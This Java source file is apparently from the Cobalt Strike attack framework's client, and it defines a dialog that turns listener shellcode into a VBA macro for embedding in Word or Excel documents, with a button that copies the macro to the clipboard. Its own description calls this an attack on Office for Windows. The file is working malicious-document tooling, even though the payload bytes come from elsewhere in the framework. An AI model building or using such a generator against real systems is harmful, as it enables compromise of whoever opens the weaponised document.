package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import common.CommonUtils;
import common.ResourceUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.HashMap;

public class OfficeMacroDialog implements DialogListener,
        ActionListener {
    protected AggressorClient client;
    protected String macro;

    public OfficeMacroDialog(AggressorClient client) {
        this.client = client;
    }

    public void macroDialog(byte[] stager) {
        JFrame dialog = DialogUtils.dialog("Macro Instructions", 640, 480);
        JLabel steps = new JLabel();
        steps.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        steps.setText(CommonUtils.bString(CommonUtils.readResource("resources/macro.html")));
        this.macro = CommonUtils.bString(new ResourceUtils(this.client).buildMacro(stager));
        JButton a = new JButton("Copy Macro");
        a.addActionListener(this);
        dialog.add(steps, "Center");
        dialog.add(DialogUtils.center(a), "South");
        dialog.pack();
        dialog.setVisible(true);
    }

    @Override
    public void actionPerformed(ActionEvent ev) {
        DialogUtils.addToClipboard(this.macro);
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        String listener = options.get("listener") + "";
        byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), listener);
        this.macroDialog(stager);
    }

    public void show() {
        JFrame dialog = DialogUtils.dialog("MS Office Macro", 640, 480);
        DialogManager controller = new DialogManager(dialog);
        controller.addDialogListener(this);
        controller.listener("listener", "Listener:", this.client.getConnection(), this.client.getData());
        JButton ok = controller.action("Generate");
        JButton help = controller.help("https://www.cobaltstrike.com/help-office-macro-attack");
        dialog.add(DialogUtils.description("This package generates a VBA macro that you may embed into a Microsoft Word or Excel document. This attack works in x86 and x64 Office on Windows."), "North");
        dialog.add(controller.layout(), "Center");
        dialog.add(DialogUtils.center(ok, help), "South");
        dialog.pack();
        dialog.setVisible(true);
    }
}

